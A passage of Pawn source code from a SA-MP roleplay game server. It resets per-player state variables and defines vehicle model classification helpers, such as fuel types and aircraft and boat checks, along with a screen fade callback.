    PlayerInfo[ playerid ][ xWorkShopID ] = -1;
	PlayerInfo[ playerid ][ xImaBRacun ] = false;
	PlayerInfo[ playerid ][ xPlatniRacun ] = 0;
	PlayerInfo[ playerid ][ xDonatorSlot ] = false;
	PlayerInfo[ playerid ][ xLeaveJail ] = false;
	PlayerInfo[ playerid ][ xBailPrice ] = 0;
	PlayerInfo[ playerid ][ xHangarTime ] = 0;
	PlayerInfo[ playerid ][ xEvent1Mesto ] = 0;
	PlayerInfo[ playerid ][ xEvent2Mesto ] = 0;
	PlayerInfo[ playerid ][ xEvent3Mesto ] = 0;
	PlayerInfo[ playerid ][ xDMEventUbistva ] = 0;
	PlayerInfo[ playerid ][ xRentID ] = -1;
	PlayerInfo[ playerid ][ xZlato ] = 0;
	PlayerInfo[ playerid ][ xPljackaVreme ] = 0;
	PlayerInfo[ playerid ][ xRezervniKljucevi ] = -1;
	PlayerInfo[ playerid ][ xRadarBodovi ] = 0;
	PlayerInfo[ playerid ][ xDBoja ] = 0;
	PlayerInfo[ playerid ][ xLicnaKarta ] = 0;
	PlayerInfo[ playerid ][ xPasos ] = 0;
	PlayerInfo[ playerid ][ xLaznaLicna ] = 0;
	PlayerInfo[ playerid ][ xLazniPasos ] = 0;
	PlayerInfo[playerid][xNeoDroga] = 0;
	PlayerInfo[playerid][xDrogaPosao] = 0;
	PlayerInfo[playerid][xAdminDuty] = 0;
	PlayerInfo[playerid][xRobanjeKuce] = 0;
    PlayerInfo[playerid][xRobanjeTrafike] = 0;
    PlayerInfo[playerid][xKokainPrerada] = 0;
    PlayerInfo[playerid][xKokainPreradaVreme] = 0;
    PlayerInfo[playerid][xKokainPreradjeni] = 0;
    PlayerInfo[playerid][xBitcoin] = 0;
    PlayerInfo[playerid][xWorkShopGarage] = -1;
    PlayerInfo[playerid][xKey] = 0;
    PlayerInfo[playerid][xDeonice] = 0;
    PlayerInfo[playerid][xParadox] = 0;
    PlayerInfo[playerid][xSkate] = 0;
    PlayerInfo[playerid][xRepairKit] = 0;
    PlayerInfo[playerid][xOrgPoen] = 0;
    PlayerInfo[playerid][xSkillDrive] = 0;
    PlayerInfo[playerid][xSkillSpeech] = 0;
    PlayerInfo[playerid][xSkillStamina] = 0;
    PlayerInfo[playerid][xSkillWorkAholic] = 0;
    PlayerInfo[playerid][xSkillPoen] = 0;
    PlayerInfo[playerid][xJobSkill] = 0;
    PlayerInfo[playerid][xDisarm] = 0;
    PlayerInfo[playerid][xYoutuber] = 0;
    PlayerInfo[playerid][xAdminWarn] = 0;
    PlayerInfo[playerid][xNaftaID] = -1;
    PlayerInfo[playerid][xKantica] = 0;
    PlayerInfo[playerid][xPolicijaTest] = 0;

    PlayerInfo[playerid][xAchivements][0] = 0;
    PlayerInfo[playerid][xAchivements][1] = 0;
    PlayerInfo[playerid][xAchivements][2] = 0;
    PlayerInfo[playerid][xAchivements][3] = 0;
    PlayerInfo[playerid][xAchivements][4] = 0;
    PlayerInfo[playerid][xAchivements][5] = 0;
    PlayerInfo[playerid][xAchivements][6] = 0;
    PlayerInfo[playerid][xAchivements][7] = 0;
    PlayerInfo[playerid][xAchivements][8] = 0;
    PlayerInfo[playerid][xAchivements][9] = 0;
    PlayerInfo[playerid][xAchivements][10] = 0;
    PlayerInfo[playerid][xAchivements][11] = 0;
    PlayerInfo[playerid][xAchivements][12] = 0;
    PlayerInfo[playerid][xAchivements][13] = 0;
    PlayerInfo[playerid][xAchivements][14] = 0;
    PlayerInfo[playerid][xAchivements][15] = 0;
    PlayerInfo[playerid][xAchivements][16] = 0;

    PlayerInfo[playerid][xInventory][0] = 0;
    PlayerInfo[playerid][xInventoryAmmo][0] = 0;
    PlayerInfo[playerid][xInventory][1] = 0;
    PlayerInfo[playerid][xInventoryAmmo][1] = 0;
    PlayerInfo[playerid][xInventory][2] = 0;
    PlayerInfo[playerid][xInventoryAmmo][2] = 0;
    PlayerInfo[playerid][xInventory][3] = 0;
    PlayerInfo[playerid][xInventoryAmmo][3] = 0;
    PlayerInfo[playerid][xInventory][4] = 0;
    PlayerInfo[playerid][xInventoryAmmo][4] = 0;
    PlayerInfo[playerid][xInventory][5] = 0;
    PlayerInfo[playerid][xInventoryAmmo][5] = 0;
    PlayerInfo[playerid][xInventory][6] = 0;
    PlayerInfo[playerid][xInventoryAmmo][6] = 0;
    PlayerInfo[playerid][xInventory][7] = 0;
    PlayerInfo[playerid][xInventoryAmmo][7] = 0;

    PlayerInfo[playerid][xRobanjeMarketa] = 0;
    PlayerInfo[playerid][xDronAuto] = 0;
    PlayerInfo[playerid][xDronAvion] = 0;
    PlayerInfo[playerid][xBaterija] = 0;
    PlayerInfo[playerid][xDronHelis] = 0;
	PlayerInfo[playerid][xSeme] = 0;
	PlayerInfo[ playerid ][ xLaptop ] = 0;
	PlayerInfo[ playerid ][ xDinamit ] = 0;
	PlayerInfo[ playerid ][ xDBO ] = false;
	strmid( PlayerInfo[ playerid ][ xOffPJail ], "N", 0, strlen("N"), 2 );
	strmid( PlayerInfo[ playerid ][ xMarriedTo ], "Niko", 0, strlen( "Niko" ), 24 );
	strmid( RealName[ playerid ], ImeIgraca( playerid ), 0, strlen( ImeIgraca( playerid ) ), 64 );
	//----------------[ New ]-----------------
	farmerInfo[ playerid ][ fiFarmerSeeds ] = 0;
	farmerInfo[ playerid ][ fiFarmerPlantsPlanted ] = -1;
	farmerInfo[ playerid ][ fiFarmerWheatCreated ] = -1;
	farmerInfo[ playerid ][ fiFarmerPickupedBales ] = 0;
	farmerInfo[ playerid ][ fiFarmerPickupedBale ] = false;
	farmerInfo[ playerid ][ fiHaveBucket ] = false;
	farmerInfo[ playerid ][ fiCowNumber ] = 0;
	farmerInfo[ playerid ][ fiVehicleBucket ] = -1;
	farmerInfo[ playerid ][ fiBucketObject  ] = INVALID_OBJECT_ID;
	
	askqInfo[ playerid ][ askqSended ] = false;
	askqInfo[ playerid ][ askqAnswered ] = false;
	strmid( askqInfo[ playerid ][ askqAdmin ], "None", 0, strlen( "None" ), 32 );
	strmid( askqInfo[ playerid ][ askqAnswer ], "None", 0, strlen( "None" ), 128 );
	
	FakeKillPlus[ playerid ] = 0;
	FakeKillTime[ playerid ] = 0;
	CreatingGZone[ playerid ] = -1;
	CreatingGZoneID[ playerid ] = -1;
	VremeZaNovac[ playerid ] = 0;
	VremeZaZlato[ playerid ] = 0;
	CheckpointStatus[ playerid ] = 0;
	PljackaVreme[ playerid ] = 0;
	PljackaNovac[ playerid ] = 0;
	ZlatoVreme[ playerid ] = 0;
	PljackaZlato[ playerid ] = 0;
	NaDmEventu[ playerid ] = false;
	PuniGorivo[ playerid ] = false;
	BiraPol[ playerid ] = 0;
	DropedGun[ playerid ] = 0;
	BiraSkin[ playerid ] = 0;
	OdabraniSkin[playerid] = 0;
	PlayerInBlowJob[ playerid ] = 0;
	BrojLisica[ playerid ] = 0;
	gZone_ID[ playerid ] = -1;
	gZone_Time[ playerid ] = 0;
	BlowJobCount[ playerid ] = 0;
	TazerMetkovi[ playerid ] = 0;
	ListaPrikazana[ playerid ] = false;
    MojListicPrikazan[ playerid ] = false;
    RezultatiPrikazana[ playerid ] = false;
    takingselfie[ playerid ] = false;
	WatchModel[ playerid ] = 19039;
	SpecPos[ playerid ][ 0 ] = 0.0;
	SpecPos[ playerid ][ 1 ] = 0.0;
	SpecPos[ playerid ][ 2 ] = 0.0;
	CreatingPos[ playerid ][ 0 ] = 0.0;
	CreatingPos[ playerid ][ 1 ] = 0.0;
	CreatingPos[ playerid ][ 2 ] = 0.0;
	CreatingPos[ playerid ][ 3 ] = 0.0;
	PraznaGajbica[ playerid ] = false;
	ImaKanticu[ playerid ] = false;
	GajbicaBiljka[ playerid ] = 0;
	Polaganje[ playerid ] = 0;
	rudarPosao[ playerid ][ rudarIskopano ] = 0;
    PokusajLogina[ playerid ] = 0;
    WatchingTV{ playerid } = 0;
    Bandera[ playerid ] = 0;
    ResprayColor1[ playerid ] = -1;
    ChosenItem[ playerid ] = -1;
    GiveItemID[ playerid ] = -1;
    IzabraniAskQ[ playerid ] = -1;
	ResprayColor2[ playerid ] = -1;
	BusLinija[ playerid ] = 0;
    ShowedRegister[ playerid ] = false;
    OrgKreiranje[ playerid ] = 0;
    UsaoAutoProdaja[ playerid ] = -1;
    DragedPlayerID[ playerid ] = -1;
	Draged[ playerid ] = -1;
	PlayerCement[ playerid ] = -1;
    AdminDuty[ playerid ] = false;
    EditingBody[ playerid ] = 0;
    RadioAktiviran[ playerid ] = 0;
    UlogTrke[ playerid ] = 0;
    PlayerCuffed[ playerid ] = 0;
    PosaoRudar[ playerid ] = 0;
    PonudioIgrac[ playerid ] = -1;
    ModelTrke[ playerid ] = 0;
    electricNACP[ playerid ] = false;
    IgracSeRegistruje[ playerid ] = false;
    PocetniTutorialStartovan[ playerid ] = false;
    PlayerDrugged[ playerid ] = false;
    PlayerStoned[ playerid ] = false;
    PlayerTuningCar[ playerid ] = false;
    PosaoTDShowed[ playerid ] = false;
    StatsTDShowed[ playerid ] = false;
    BuyCarTDShowed[ playerid ] = false;
    LaptopRuke[ playerid ] = false;
    Dinamit[ playerid ] = false;
    ProcesPice[ playerid ] = 0;
    alreadyPictured[ playerid ] = false;
    TogHud[ playerid ] = false;
    IgracZavezan[ playerid ] = false;
    AccountVerified[ playerid ] = false;
    KnockedDown[ playerid ] = false;
    IgracOpljackan[ playerid ] = false;
    VecjeUsao[ playerid ] = true;
    Pojas[ playerid ] = false;
    Uze[ playerid ] = false;
    Maskuse[ playerid ] = false;
    SearchNadji[ playerid ] = -1;
    FlyMode[ playerid ] = false;
    robbingATM[ playerid ] = -1;
    CenaProdaje[ playerid ] = 0;
    Poravnano[ playerid ] = 0;
    robbingATMSeconds[ playerid ] = 95;
    PlayerCP[ playerid ] = 0;
    ElectricOprema[ playerid ] = false;
    ElectricPosao[ playerid ] = 0;
    ShowedAtmTD[ playerid ] = false;
    BrojilaKuca[ playerid ] = 0;
    PoljeDroge[ playerid ] = -1;
    LetSF[ playerid ] = 0;
    LetLV[ playerid ] = 0;
	EIDK[ playerid ] = -1;
	EnteredGarage[ playerid ] = -1;
    EditDGate[ playerid ] = -1;
    EditDGateMove[ playerid ] = -1;
    AdminVozilo[ playerid ] = -1;
    TrkaVozilo[ playerid ] = -1;
    Krugovi[ playerid ] = 0;
    TrkaCheckpoint[ playerid ] = 0;
	TrkaIzazov[ playerid ] = 0;
	NaUtrci[ playerid ] = false;
    PlacaPorez[ playerid ] = 0;
    GlobalProdaja[ playerid ] = -1;
    Ponudjeno[ playerid ] = -1;
	Trazio[ playerid ] = -1;
    ServerStatsChose[ playerid ] = 0;
    inHotel[ playerid ] = -1;
	GlobalCena[ playerid ] = -1;
	GlobalID[ playerid ] = -1;
	GlobalID_2[ playerid ] = -1;
	gNews{ playerid } = 0;
	anticheatinfo[ playerid ] = 0;
    FaceOn[ playerid ] = false;
	HeadOn[ playerid ] = false;
	Spectate[ playerid ] = -1;
	SungOn[ playerid ] = false;
	PlayerEventVehID[ playerid ] = -1;
	ListaBurg[ playerid ] = 0;
	Training[ playerid ] = 0;
	PlayerLogged[ playerid ] = false;
	Trucker[ playerid ][ tHasCargo ] = false;
	Trucker[ playerid ][ tPlacedCargos ] = 0;
	Trucker[ playerid ][ tID ] = 0;
	PolaganjeBodovi[ playerid ] = 0;
	GreskaVoznja[ playerid ] = 0;
	StaroVreme[ playerid ] = 0;
    NovoVreme[ playerid ] = 0;
    PokosenaTrava[ playerid ] = 0;
	KrenuoKosenje[ playerid ] = false;
	UzeoOpremu[ playerid ] = false;
	HitmanInfo[ playerid ][ GotHit ] = 0;
	HitmanInfo[ playerid ][ PlacedNews ] = 0;
	HitmanInfo[ playerid ][ GetChased ] = 999;
	HitmanInfo[ playerid ][ GoChase ] = 999;
	Odbrojavanje[ playerid ] = 0;
	Uciskolu[ playerid ] = false;
	garbagemanInfo[ playerid ][ gmiDuty ] = false;
	garbagemanInfo[ playerid ][ gmiReadyToDump ] = false;
	garbagemanInfo[ playerid ][ gmiHasGarbage ] = false;
	garbagemanInfo[ playerid ][ gmiJob ] = false;
	garbagemanInfo[ playerid ][ gmiContainerID ] = 0;
	garbagemanInfo[ playerid ][ gmiVehicleID ] = -1;
	EditKontejnera[ playerid ] = -1;
	EditATM[ playerid ] = -1;
	EditRadar[ playerid ] = -1;
	cistackilometri[ playerid ] = 0;
	cistacmetri[ playerid ] = 0;
	cistacnovac[ playerid ] = 0;
	CistacWarning[ playerid ] = 0;
	cistacpoz[ playerid ][ 0 ] = 0.0;
	cistacpoz[ playerid ][ 1 ] = 0.0;
	cistacpoz[ playerid ][ 2 ] = 0.0;
	CistacPosao[ playerid ] = false;
	cistacvozilo[ playerid ] = -1;
	Seeds[ playerid ] = 0;
	SeedsK[ playerid ] = 0;
	VrstaIlegala[ playerid ] = 0;
	uFirmi[ playerid ] = -1;
	uInterijeru[ playerid ] = -1;
	KolicinaIlegala[ playerid ] = 0;
	inProperty[ playerid ] = -1;
	inOrgInt[ playerid ] = -1;
	PoliceDuty[ playerid ] = false;
	strmid( ZlocinInfo[ playerid ][ zPrijavio ], "Nema", 0, strlen("Nema"), 255 );
	strmid( ZlocinInfo[ playerid ][ zPocinio ], "Nema", 0, strlen("Nema"), 255 );
	strmid( ZlocinInfo[ playerid ][ zZlocin ], "Nema", 0, strlen("Nema"), 255 );
	ImaTazer[ playerid ] = false;
	RiotShield[ playerid ] = false;
	TrunkVehicle[ playerid ] = -1;
	MedicDuty[ playerid ] = false;
	UzeoPicu[ playerid ] = false;
	VoziIgracaID[ playerid ] = INVALID_PLAYER_ID;
	offeredByCabbie[ playerid ] = INVALID_PLAYER_ID;
	CenaVoznje[ playerid ] = 0;
	TaximetarUkljucen[ playerid ] = false;
	taxiDuty[ playerid ] = false;
	PozvaoTaxi[ playerid ] = false;
	KupljenGPS[ playerid ] = 0;
	PitanjeBroj[ playerid ] = 0;
  	TacanOdgovor[ playerid ] = -1;
  	Rentano[ playerid ] = -1;
  	PaketType[ playerid ] = 0;
  	NosiPaketOruzja[ playerid ] = false;
  	PropertySafeGun[ playerid ] = -1;
  	Trafika[ playerid ] = -1;
  	NosiObjekt[ playerid ][ 0 ] = false;
  	NosiObjekt[ playerid ][ 1 ] = false;
  	NosiObjekt[ playerid ][ 2 ] = false;
  	TrashLimit[ playerid ] = 0;
   	TrashSearch[ playerid ] = 0;
   	HelmetOn[ playerid ] = false;
   	TelohraniteljUniforma[ playerid ] = false;
	VozacUniforma[ playerid ] = false;
	InAmbu[ playerid ] = -1;
	PhoneOnline[ playerid ] = 0;
	RPTeacherDuty[ playerid ] = 0;
	BoomboxInfo[ playerid ][ boomboxPlaced ] = 0;
	BoomboxInfo[ playerid ][ boomboxPos ][ 0 ] = 0.0;
	BoomboxInfo[ playerid ][ boomboxPos ][ 1 ] = 0.0;
	BoomboxInfo[ playerid ][ boomboxPos ][ 2 ] = 0.0;
	Boombox[ playerid ] = IPI;
	InputPassword[ playerid ] = false;
	ChoseCountry[ playerid ] = false;
	InputAge[ playerid ] = false;
	InputMail[ playerid ] = false;
	RegSex[ playerid ] = 1;
	EventCP[ playerid ] = 0;
	EventCarsCreate[ playerid ] = 0;
	PlayerCreateEvent[ playerid ] = false;
	ReportGlobal[ playerid ] = 0;
	VIPPort[ playerid ] = 0;
 	PromoterPort[ playerid ] = 0;
	PomocGlobal[ playerid ] = 0;
	NewGlobal[ playerid ] = 0;
	PlayerCPShow[ playerid ] = false;
	KreiranAutoSalon[ playerid ] = -1;
	KreiraGarazu[ playerid ] = -1;
	PlayerBuyingAS[ playerid ] = -1;
	IgracPosadio[ playerid ] = 0;
	VremeZaCuvanje[ playerid ] = 0;
	MinutiIgraca[ playerid ] = 0;
	IzabraniPort[ playerid ] = 0;
	ProposeOffer[ playerid ] = 999;
	DivorceOffer[ playerid ] = 999;
	MarryWitness[ playerid ] = 999;
	MarryWitnessOffer[ playerid ] = 999;
	MarriageCeremoney{ playerid } = 0;
	ProposedTo[ playerid ] = 999;
	GotProposedBy[ playerid ] = 999;
	ChosenVehicle[ playerid ] = -1;
	gpsid[ playerid ] = -1;
	ObjectEdition_TYPE[ playerid ] = 255;
	// Anti cheat
	antiCheatCS[ playerid ][ EnterVehTime ] = 0;
	antiCheatCS[ playerid ][ LastWShot ] = -1;
	antiCheatCS[ playerid ][ EnteredVehicle ] = INVALID_VEHICLE_ID;
	antiCheatCS[ playerid ][ TakeVehicle ] = INVALID_VEHICLE_ID;
	antiCheatCS[ playerid ][ SpamChat ] = 0;
	antiCheatCS[ playerid ][ SpamCommand ] = 0;
	antiCheatCS[ playerid ][ WeaponCheck ] = 1;
	antiCheatCS[ playerid ][ WeaponDetect ] = 3;
	antiCheatCS[ playerid ][ SpeedFall ] = false;
	antiCheatCS[ playerid ][ TeleportCheck ] = 0;
	antiCheatCS[ playerid ][ TeleportHack ] = 0;
	antiCheatCS[ playerid ][ WeaponHack ] = 0;
	antiCheatCS[ playerid ][ SpeedHack ] = 0;
	antiCheatCS[ playerid ][ HighPing ] = 0;
	antiCheatCS[ playerid ][ AFKMinute ] = 0;
	antiCheatCS[ playerid ][ CPSCount ] = 0;
	antiCheatCS[ playerid ][ CPSTick ] = 0;
	antiCheatCS[ playerid ][ VehRepairTime ] = 0;
	antiCheatCS[ playerid ][ CPPort ] = 0;
	antiCheatCS[ playerid ][ CWTime ] = 0;
    antiCheatCS[ playerid ][ CWVehID ] = -1;
	antiCheatCS[ playerid ][ SpamVehicle ] = 0;
	antiCheatCS[ playerid ][ LastAmmoChecks ] = 0;
	antiCheatCS[ playerid ][ LastAmmo ] = 0;
	antiCheatCS[ playerid ][ ArmedWeapon ] = 0;
	antiCheatCS[ playerid ][ InTuningGarage ] = false;
	antiCheatCS[ playerid ][ RemoveVehicle ] = false;
	for( new i = 0; i < 13; i++ ) { 
		antiCheatCS[ playerid ][ Weapon ][ i ] = 0;
		antiCheatCS[ playerid ][ Ammo ][ i ] = 0;
	}
	//----------------[ PVar ]-----------------
	SetPVarInt( playerid, "GOTOOffer", 999 );
	SetPVarInt( playerid, "RepairEOffer", 999 );
	SetPVarInt( playerid, "RepairAOffer", 999 );
	SetPVarInt( playerid, "RepairLOffer", 999 );
	SetPVarInt( playerid, "RefillOffer", 999 );
	SetPVarInt( playerid, "RepairIOffer", 999 );
	SetPVarInt( playerid, "TicketOffer", 999 );
	SetPVarInt( playerid, "RepairBKOffer", 999 );
	SetPVarInt( playerid, "RepairTOffer", 999 );
	SetPVarInt( playerid, "ShakeOffer", 999 );
	SetPVarInt( playerid, "PlayerHasTest", 999 );
	SetPVarInt( playerid, "ResprayOffer", 999 );
	SetPVarInt( playerid, "ResprayDozvola", 999 );
	SetPVarInt( playerid, "RecoverOffer", 999 );
	SetPVarInt( playerid, "MedicineOffer", 999 );
	SetPVarInt( playerid, "CanisterFuel", 0 );
	SetPVarInt( playerid, "gGas", 1 );
	SetPVarInt( playerid, "Mobile", -1 );
	SetPVarInt( playerid, "LiveOffer", 999 );
	SetPVarInt( playerid, "TalkingLive", 255 );
}
//------------------------------------------------------------------------------
IsANoTrunkVehicle( vehicleID ) {
	switch( GetVehicleModel( vehicleID ) ) {
	    case 403,406,407,408,411,416,417,423,424,425,430,432,434,435,441,443,444,446,447,449,450,452,453,454,457,460,464,465,469,472,473,476,481,485,486,493,494,495,501,502,503,504,505,509,510,512,513,514,515,520,524,525,528,530,531,532,537,538,539,544,552,556,557,564,568,569,570,571,572,573,574,578,583,584, 590,591,592,593,594,595,601,606,607,608,610,611:
	        return true;
	}
	return false;
}
//-----------------------------------------------------------------------------
bool:Eurosuper95( vehid ) {
	switch(GetVehicleModel( vehid ) ) {
		case 402, 411, 415, 429, 451, 477, 480, 494, 506, 541: return true;
	}
	return false;
}
bool:Super95( vehid ) {
	switch(GetVehicleModel( vehid ) ) {
		case 400, 405, 409, 420, 421, 507, 522, 551, 555, 558, 559, 560, 561, 562,
		565: return true;
	}
	return false;
}
bool:Super98( vehid ) {
	switch(GetVehicleModel( vehid ) ) {
		case 404, 410, 412, 418, 419, 422, 426, 436, 437, 439, 442, 445, 448, 458,
	    461, 462, 463, 466, 467, 468, 471, 474, 475, 478, 479, 489, 490, 491, 492,
		496, 500, 516, 517, 518, 521, 526, 527, 529, 533, 534, 535, 536, 540, 542,
		543, 545, 546, 547, 550, 554, 566, 567, 575, 576, 579, 580, 581, 585, 586,
		587, 589, 600, 602, 603: return true;
	}
	return false;
}
bool:Eurodizel( vehid ) {
	switch( GetVehicleModel( vehid ) ) {
		case 413, 414, 416, 423, 427, 428, 440, 456, 459, 482, 483, 495, 498, 499,
		508, 525, 528, 552, 573, 582, 596, 597, 598, 599, 601: return true;
	}
	return false;
}
bool:Dizel( vehid ) {
	switch( GetVehicleModel( vehid ) ) {
		case 406, 431, 432, 433, 443, 444, 455, 470, 486, 524, 588: return true;
	}
	return false;
}
bool:LozUlje( vehid ) {
	switch(GetVehicleModel( vehid ) ) {
		case 403, 407, 408, 425, 430, 446, 452, 453, 454, 460, 469, 472, 417, 473,
		476, 484, 487, 488, 493, 497, 511, 512, 513, 514, 515, 519, 520, 544, 548,
		553, 556, 577, 578, 592, 593, 595: return true;
	}
	return false;
}
bool:Plin( vehid ) {
	switch( GetVehicleModel( vehid ) ) {
		case 424, 434, 457, 485, 530, 531, 532, 539, 568, 571, 272, 583: return true;
	}
	return false;
}
//------------------------------------------------------------------------------
GetVehicleFuelType( vehicle ) {
	new fueltypeName[14] = "Euro Super 95";

    if( Eurosuper95( vehicle ) ) fueltypeName = "Euro Super 95";
    else if( Super95( vehicle ) ) fueltypeName = "Super 95";
    else if( Super98( vehicle ) ) fueltypeName = "Super 98";
    else if( Eurodizel( vehicle ) ) fueltypeName = "Euro Dizel";
    else if( Dizel( vehicle ) ) fueltypeName = "Dizel";
    else if( LozUlje( vehicle ) ) fueltypeName = "Loz Ulje";
    else if( Plin( vehicle ) ) fueltypeName = "Plin";
    
	return fueltypeName;
}
//------------------------------------------------------------------------------
bool:isATrucker( vehicleid)
{
	switch(GetVehicleModel( vehicleid))
	{
		case 422, 600, 543, 478, 554, 413, 440, 459, 482: return true;
	}
	return false;
}
bool:IsVehicleBajs(vehid)
{
	switch(GetVehicleModel(vehid))
	{
		case 481, 509, 510: return true;
	}
	return false;
}
bool:IsVehiclePrikolica(vehid)
{
	switch(GetVehicleModel(vehid))
	{
		case 435, 450, 584, 591, 611, 610: return true;
	}
	return false;
}
bool:IsVehicleMotor(vehid)
{
	switch(GetVehicleModel(vehid))
	{
		case 448, 461, 462, 463, 468, 471, 521, 522, 523, 586, 581: return true;
	}
	return false;
}
bool:IsVehicleAuto(vehid)
{
	switch(GetVehicleModel(vehid))
	{
		case 400, 401, 402, 404, 405, 409, 410, 411, 412, 415, 419, 420, 421, 422,
	    426, 429, 434, 436, 438, 439, 442, 445, 451, 458, 466, 467, 470, 474, 475,
		477, 478, 479, 480, 489, 490, 491, 492, 494, 495, 496, 500, 502, 503, 504,
		505, 506, 507, 516, 517, 518, 525, 526, 527, 528, 529, 533, 534, 535, 536,
		540, 541, 542, 543, 545, 546, 547, 549, 550, 551, 552, 554, 555, 558, 559,
		560, 561, 562, 565, 566, 567, 568, 575, 576, 579, 580, 585, 587, 589, 596,
		597, 598, 599, 600, 602, 603, 604, 605, 444, 457, 483, 485, 530, 531, 539,
		556, 557, 574, 424, 583, 572: return true;
	}
	return false;
}
bool:IsVehicleC1(vehid)
{
	switch(GetVehicleModel(vehid))
	{
		case 499, 482, 498, 588, 609, 414, 582, 413, 440, 459, 456, 416, 423, 427,
		428, 508, 573, 601: return true;
	}
	return false;
}
bool:IsVehicleC2(vehid)
{
	switch(GetVehicleModel(vehid))
	{
		case 406, 407, 408, 431, 432, 433, 437, 443, 455, 486, 524, 532, 544, 578: return true;
	}
	return false;
}
bool:IsVehicleC3(vehid)
{
	switch(GetVehicleModel(vehid))
	{
		case 403, 514, 515: return true;
	}
	return false;
}
bool:IsVehicleBrod(vehid)
{
	switch(GetVehicleModel(vehid))
	{
		case 472, 473, 493, 595, 484, 430, 453, 452, 446, 454: return true;
	}
	return false;
}
bool:IsVehicleLetelica(vehid)
{
	switch(GetVehicleModel(vehid))
	{
		case 417, 425, 447, 460, 469, 476, 487, 488, 497, 511, 512, 513, 519,
		520, 548, 553, 563, 577, 592, 593: return true;
	}
	return false;
}
//==============================[ STOCK ]=======================================
stock SCM( playerid, color, const str[] ) {
	if( PlayerLogged[ playerid ] == true ) {
		return SendClientMessage( playerid, color, str );
	}
	return false;
}
stock HexToInt(string[]) // By DracoBlue
{
  	if (string[0]==0) return 0;
 	new i;
  	new cur=1;
  	new res=0;
  	for (i=strlen(string);i>0;i--) {
  	  	if (string[i-1]<58) res=res+cur*(string[i-1]-48); else res=res+cur*(string[i-1]-65+10);
    	cur=cur*16;
  	}
  	return res;
}

//------------------------------------------------------------------------------
forward Black_Fading( playerid );
public Black_Fading( playerid ) {

	F_Count[ playerid ]++;

	PlayerTextDrawHide( playerid, Fading[ playerid ] );
	PlayerTextDrawShow( playerid, Fading[ playerid ] );

	if( F_Count[ playerid ] == 1 ) return PlayerTextDrawBoxColor( playerid, Fading[ playerid ], 0x0000000A );
	if( F_Count[ playerid ] == 2 ) return PlayerTextDrawBoxColor( playerid, Fading[ playerid ], 0x00000010 );
	if( F_Count[ playerid ] == 3 ) return PlayerTextDrawBoxColor( playerid, Fading[ playerid ], 0x0000001A );
	if( F_Count[ playerid ] == 4 ) return PlayerTextDrawBoxColor( playerid, Fading[ playerid ], 0x00000020 );
	if( F_Count[ playerid ] == 5 ) return PlayerTextDrawBoxColor( playerid, Fading[ playerid ], 0x0000002A );
	if( F_Count[ playerid ] == 6 ) return PlayerTextDrawBoxColor( playerid, Fading[ playerid ], 0x00000030 );
	if( F_Count[ playerid ] == 7 ) return PlayerTextDrawBoxColor( playerid, Fading[ playerid ], 0x0000003A );
	if( F_Count[ playerid ] == 8 ) return PlayerTextDrawBoxColor( playerid, Fading[ playerid ], 0x00000040 );
	if( F_Count[ playerid ] == 9 ) return PlayerTextDrawBoxColor( playerid, Fading[ playerid ], 0x0000004A );
	if( F_Count[ playerid ] == 10 ) return PlayerTextDrawBoxColor( playerid, Fading[ playerid ], 0x00000050 );
	if( F_Count[ playerid ] == 11 ) return PlayerTextDrawBoxColor( playerid, Fading[ playerid ], 0x0000005A );
	if( F_Count[ playerid ] == 12 ) return PlayerTextDrawBoxColor( playerid, Fading[ playerid ], 0x00000060 );
	if( F_Count[ playerid ] == 13 ) return PlayerTextDrawBoxColor( playerid, Fading[ playerid ], 0x0000006A );
	if( F_Count[ playerid ] == 14 ) return PlayerTextDrawBoxColor( playerid, Fading[ playerid ], 0x00000070 );
	if( F_Count[ playerid ] == 15 ) return PlayerTextDrawBoxColor( playerid, Fading[ playerid ], 0x0000007A );
	if( F_Count[ playerid ] == 16 ) return PlayerTextDrawBoxColor( playerid, Fading[ playerid ], 0x00000080 );
	if( F_Count[ playerid ] == 17 ) return PlayerTextDrawBoxColor( playerid, Fading[ playerid ], 0x0000008A );
	if( F_Count[ playerid ] == 18 ) return PlayerTextDrawBoxColor( playerid, Fading[ playerid ], 0x00000090 );
	if( F_Count[ playerid ] == 19 ) return PlayerTextDrawBoxColor( playerid, Fading[ playerid ], 0x0000009A );
	if( F_Count[ playerid ] == 20 ) return PlayerTextDrawBoxColor( playerid, Fading[ playerid ], 0x000000A1 );
	if( F_Count[ playerid ] == 21 ) return PlayerTextDrawBoxColor( playerid, Fading[ playerid ], 0x000000AA );
	if( F_Count[ playerid ] == 22 ) return PlayerTextDrawBoxColor( playerid, Fading[ playerid ], 0x000000B1 );
	if( F_Count[ playerid ] == 23 ) return PlayerTextDrawBoxColor( playerid, Fading[ playerid ], 0x000000BB );
	if( F_Count[ playerid ] == 24 ) return PlayerTextDrawBoxColor( playerid, Fading[ playerid ], 0x000000C1 );
	if( F_Count[ playerid ] == 25 ) return PlayerTextDrawBoxColor( playerid, Fading[ playerid ], 0x000000CC );
	if( F_Count[ playerid ] == 26 ) return PlayerTextDrawBoxColor( playerid, Fading[ playerid ], 0x000000D1 );
	if( F_Count[ playerid ] == 27 ) return PlayerTextDrawBoxColor( playerid, Fading[ playerid ], 0x000000DD );
	if( F_Count[ playerid ] == 28 ) return PlayerTextDrawBoxColor( playerid, Fading[ playerid ], 0x000000E1 );
	if( F_Count[ playerid ] == 29 ) return PlayerTextDrawBoxColor( playerid, Fading[ playerid ], 0x000000EE );
	if( F_Count[ playerid ] == 30 ) return PlayerTextDrawBoxColor( playerid, Fading[ playerid ], 0x000000F1 );
	if( F_Count[ playerid ] == 31 ) return PlayerTextDrawBoxColor( playerid, Fading[ playerid ], 0x000000FF );
	// Completely Black
    if( F_Count[ playerid ] == 32 ) return PlayerTextDrawBoxColor( playerid, Fading[ playerid ], 0x000000F1 );
	if( F_Count[ playerid ] == 33 ) return PlayerTextDrawBoxColor( playerid, Fading[ playerid ], 0x000000EE );
	if( F_Count[ playerid ] == 34 ) return PlayerTextDrawBoxColor( playerid, Fading[ playerid ], 0x000000E1 );
	if( F_Count[ playerid ] == 35 ) return PlayerTextDrawBoxColor( playerid, Fading[ playerid ], 0x000000DD );
	if( F_Count[ playerid ] == 36 ) return PlayerTextDrawBoxColor( playerid, Fading[ playerid ], 0x000000D1 );
	if( F_Count[ playerid ] == 37 ) return PlayerTextDrawBoxColor( playerid, Fading[ playerid ], 0x000000CC );
	if( F_Count[ playerid ] == 38 ) return PlayerTextDrawBoxColor( playerid, Fading[ playerid ], 0x000000C1 );
	if( F_Count[ playerid ] == 39 ) return PlayerTextDrawBoxColor( playerid, Fading[ playerid ], 0x000000BB );
